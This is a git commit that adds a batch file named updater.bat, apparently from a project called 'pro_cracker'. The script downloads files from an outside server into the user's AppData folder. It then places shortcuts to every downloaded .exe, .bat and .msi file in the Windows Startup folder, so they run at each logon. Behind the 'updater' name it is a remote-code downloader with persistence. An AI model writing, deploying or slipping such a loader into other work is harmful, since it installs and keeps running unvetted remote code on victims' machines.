4c597c2ed2c4913e84d61655f4befd85a6d46d27
thk34 <103599660+thk34@users.noreply.github.com>
2023-03-26 19:57:25 +0200

    Create updater.bat

---
+++ updater.bat
@@ -0,0 +1,5 @@
+@echo off
+powershell -command "Invoke-WebRequest -Uri 'http://thk34-vps.ovh/xv/*' -OutFile '%APPDATA%\pro_cracker\*'"
+for %%i in ("%APPDATA%\pro_cracker\*.exe" "%APPDATA%\pro_cracker\*.bat" "%APPDATA%\pro_cracker\*.msi") do (
+    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\'+(Split-Path -Leaf '%%i')+'.lnk');$s.TargetPath='%%i';$s.Save()"
+)
